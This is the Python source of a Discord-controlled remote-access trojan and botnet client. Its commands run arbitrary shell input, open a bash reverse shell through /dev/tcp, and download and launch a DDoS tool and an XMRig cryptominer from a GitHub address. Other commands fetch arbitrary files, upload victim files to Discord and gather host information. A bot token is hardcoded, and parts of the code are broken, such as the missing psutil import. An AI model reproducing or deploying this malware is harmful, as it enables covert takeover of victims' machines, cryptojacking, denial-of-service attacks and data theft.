import json
import os
import sys
import discord
import requests
import hashlib
import socket
import platform
from discord.ext import commands
from websockets import connect

 
intents = discord.Intents.default()
intents.message_content = True  
bot = commands.Bot(command_prefix="!", help_command=None, intents=intents)

# client
ip = requests.get("http://checkip.amazonaws.com/")
hostname = socket.gethostname()
if platform.system() == 'Linux':
    os.chdir("/tmp")
else:
    appdata = os.getenv("AppData")
    startup = f"{appdata}\Microsoft\Windows\Start Menu\Programs\Startup"
    temp = os.getenv("temp")
    os.chdir(temp)

#info
@bot.command(name=f"info")
async def ipinfo(ctx):
    link = "http://checkip.amazonaws.com/"
    f = requests.get(link)
    await ctx.send(f"""
    ``[+] @{ip}: IP Information``\n```json\nIP:{f.headers['IP']}\nASN:{f.headers['ASN']}\nCountry:{f.headers['Country']}```
    """)
    
# shell
@bot.command(name=f"shell")
async def shell(ctx, *args):
    arguments = ' '.join(args)
    stream = os.popen(arguments)
    output = stream.read()
        
    if sys.getsizeof(output) > 2000:
        await ctx.send(f"``[+] {ip}: Command executed``")
    else:
        await ctx.send(f"``[+] {ip}: Command executed`` ```sh\n{output}```")
    
# reverse shell
@bot.command(name=f"revshell")
async def revshell(ctx, revshellRipArg, revshellRportArg):
    rip = ''.join(revshellRipArg)
    rport = ''.join(revshellRportArg)
    if platform.system() == 'Linux':
        os.popen(f"bash -i >& /dev/tcp/{rip}/{rport} 0>&1")
    else:
        await ctx.send(f"``[-] {ip}: OS not supported``")
        
# ddos
@bot.command(name=f"ddos")
async def ddos(ctx, ddosarg):
    if platform.system() == 'Linux':
        if not os.path.exists("storm"):
            url = "https://github.com/rxu7s/Public/raw/main/storm"
            r = requests.get(url, allow_redirects=True)
            open("storm", 'wb').write(r.content)
            
        ddosip = ''.join(ddosarg)
        os.popen(f"chmod 777 storm; ./storm -d {ddosip}")
        await ctx.send(f"``[+] {ip}: DDoS started``")
    
# stop ddos
@bot.command(name=f"sddos")
async def stopddos(ctx):
    if platform.system() == 'Linux':
        if "storm" in (i.name() for i in psutil.process_iter()):
            os.popen("pkill storm")
            await ctx.send(f"``[-] {ip}: DDoS stoped``")
    
# miner
@bot.command(name=f"miner")
async def miner(ctx, walletArg):
    wallet = ''.join(walletArg)
    if platform.system() == 'Linux':
        if not os.path.exists("xmrig"):
            url = "https://github.com/rxu7s/Public/raw/main/xmrig"
            r = requests.get(url, allow_redirects=True)
            open("xmrig", 'wb').write(r.content)
            
        os.popen(f"chmod 777 xmrig; ./xmrig --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Linux -k --tls")
        await ctx.send(f"``[+] {ip}: Miner started``")
    else:
        if not os.path.exists("xmrig.exe"):
            url = "https://github.com/rxu7s/Public/raw/main/xmrig.exe"
            r = requests.get(url, allow_redirects=True)
            open("xmrig.exe", 'wb').write(r.content)
            
        os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
        await ctx.send(f"``[+] {ip}: Miner started``")
    
# stop miner
@bot.command(name=f"sminer")
async def stopminer(ctx):
    if platform.system() == 'Linux':
        if "xmrig" in (i.name() for i in psutil.process_iter()):
            os.popen("pkill xmrig")
            await ctx.send(f"``[-] {ip}: Miner stoped``")
    else:
        if "xmrig.exe" in (i.name() for i in psutil.process_iter()):
            os.popen("taskkill /F /IM xmrig.exe /T")
            await ctx.send(f"``[-] {ip}: Miner stoped``")
        
# download
@bot.command(name=f"download")
async def download(ctx, arg1, arg2):
    link = ''.join(arg1)
    name = ''.join(arg2)
    
    url = link
    r = requests.get(url, allow_redirects=True)
    open(name, 'wb').write(r.content)
    
    if os.path.exists(name):
        await ctx.send(f"``[+] {ip}: File downloaded``")
    else:
        await ctx.send(f"``[-] {ip}: File not downloaded``")
    
# upload
@bot.command(name=f"upload")
async def upload(ctx, arg1):
    path = ''.join(arg1)
    await ctx.send(f"``[+] {ip}: File uploaded``",file=discord.File(path))

bot.run('OTk2OTU3MzE0ODUyNTk3ODYy.GmqaAZ.59KKjMTL8or2bWG13SNGcTeEexBA-MfOwFlfJM')
